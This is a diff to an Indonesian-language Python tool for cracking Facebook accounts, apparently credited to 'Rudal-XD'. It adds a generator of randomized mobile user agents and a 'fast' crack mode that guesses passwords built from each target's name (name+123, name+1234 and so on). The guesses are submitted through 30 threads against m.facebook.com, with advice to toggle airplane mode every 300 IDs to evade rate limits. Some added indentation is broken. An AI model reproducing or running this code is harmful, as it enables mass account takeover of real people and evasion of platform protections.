@@ -146,6 +146,38 @@ for xd in range(10000):
     asep = f"Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57 [FBAN/FBIOS;FBAV/209.0.0.33.90;FBBV/142900020;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/3;FBCR/U.S. Cellular;FBID/phone;FBLC/en_US;FBOP/5;FBRV/143925426]"
     uateddy = random.choice([asep,strvinfiniix,strvnokiax,strvredmi1,strvinfinix,strvoppo1,strvoppo,strvredmi, strvsamsung, strvgt])
     prem.append(uateddy)
+
+for xd in range(10000):
+	aa='Mozilla/5.0 (Linux; Android 6.0;'
+	b=random.choice(['6','7','8','9','10','11','12'])
+	c='Nexus 5 Build/MRA58N)'
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko)'
+	h=random.randrange(73,100)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile Safari/537.36'
+	uaku=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+	prem.append(uaku)	
+	
+	aa='Mozilla/5.0 (Linux; Android 5.1;'
+	b=random.choice(['6','7','8','9','10','11','12'])
+	c='ZTE T630 Build/LMY47D)'
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36 OPR/52.1.2517.139570'
+	h=random.randrange(73,100)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile Safari/537.36'
+	uaku=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+	prem.append(uaku)
+	
 def uaku():
     try:
         ua = open("bbnew.txt", "r").read().splitlines()
@@ -1475,6 +1507,10 @@ def setting():
         method.append("asyn")
     else:
         method.append("mbasik")
+    Console().print(Panel(f"{P2}[{color_text}01{P2}] metode Slow {H2}[Recomend]{P2}\n{P2}[{color_text}02{P2}] method cepat{P2}",width=60,style=f"{color_panel}"))
+        viperme = console.input(f" {H2}• {P2}Masukan : ")
+        if viperme in ["1","01"]:
+		
     Console().print(
         Panel(
             f"[bold white]Apakah Anda Ingin Mengunakan UA Manual ? Y/T",
@@ -1490,11 +1526,15 @@ def setting():
         ualu.append(bzer)
     else:
         ualuh.append("tidak")
-    passwrd()
+    Console().print(Panel(f"{P2}[{color_text}01{P2}] metode Slow {H2}[Recomend]{P2}\n{P2}[{color_text}02{P2}] method cepat{P2}",width=60,style=f"{color_panel}"))
+        viperme = console.input(f" {H2}• {P2}Masukan : ")
+        if viperme in ["1","01"]:metslow()
+        elif viperme in ["2","02"]:metcepat()
+	else:metslow()
 
 
-# -------------------[ BAGIAN-WORDLIST ]------------#
-def passwrd():
+# -------------------[ CRACK-SLOW ]------------#
+def metslow():
     global prog, des
     bi = random.choice([u, k, kk, b, h, hh])
     print("")
@@ -1599,7 +1639,7 @@ def passwrd():
                     pool.submit(regulerv2, idf, pwv)
                 else:
                     pool.submit(mbasic, idf, pwv)
-        print("")
+    print("")
     Console().print(
         Panel(
             f"[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan",
@@ -1614,6 +1654,76 @@ def passwrd():
     print("thanks Rudal-XD")
     print("")
 
+#-------------------[ CRACK-CEPAT ]------------#
+def metcepat():
+    global prog,des
+    bi = random.choice([u,k,kk,b,h,hh])
+    print('')
+    urut = []
+    urut.append(panel(f'[bold green]%s [bold white]'%(okc),width=30,title=f"[bold green]OK SAVE",style=f"{color_panel}"))
+    urut.append(panel(f'[bold yellow]%s [bold white]'%(cpc),width=30,title=f"[bold yellow]CP SAVE",style=f"{color_panel}"))
+    wa.print(Columns(urut))
+    awal = datetime.now()
+    Console().print(Panel(f'[bold white]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ',title=f"[bold green]Informasi",width=60,style=f"{color_panel}"))
+    prog = Progress(TextColumn('{task.description}'))
+    des = prog.add_task('',total=len(id2))
+    with prog:
+        with tred(max_workers=30) as pool:
+            for yuzong in id2:
+                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+                frs = nmf.split(" ")[0]
+                pwv = []
+                if len(nmf)<6:
+                    if len(frs)<3:
+                        pass
+                    else:
+                        pwv.append(nmf)
+                        pwv.append(frs+'321')
+                        pwv.append(frs+'123')
+                        pwv.append(frs+'1234')
+                        pwv.append(frs+'12345')
+                        pwv.append(frs+'123456')
+                else:
+                    if len(frs)<3:
+                        pwv.append(nmf)
+                    else:
+                        pwv.append(nmf)
+                        pwv.append(frs+'321')
+                        pwv.append(frs+'123')
+                        pwv.append(frs+'1234')
+                        pwv.append(frs+'12345')
+                        pwv.append(frs+'123456')
+                        pwv.append(frs+'1234567')
+                if 'ya' in pwpluss: 
+                    for xpwd in pwnya:
+                        pwv.append(xpwd)
+                else:pass
+                if "reguler" in method:
+                    pool.submit(reguler, idf, pwv,'m.facebook.com')
+                elif "asyn" in method:
+                    pool.submit(asyncc, idf, pwv)
+                elif "validate" in method:
+                    pool.submit(validate, idf, pwv)
+                elif "mbasik" in method:
+                    pool.submit(mbasic, idf, pwv)
+                elif "regulerv2" in method:
+                    pool.submit(regulerv2, idf, pwv)
+                else:
+                    pool.submit(mbasic, idf, pwv)
+    print("")
+    Console().print(
+        Panel(
+            f"[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan",
+            subtitle="╭───",
+            subtitle_align="left",
+            title=f"[bold green]Cek Opsi",
+            width=60,
+            style=f"{color_panel}",
+        )
+    )
+    Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
+    print("thanks Rudal-XD")
+    print("")
 # --------------------[ METODE MBASIC ]-----------------#
 def mbasic(idf,pwv):
 	global loop,ok,cp
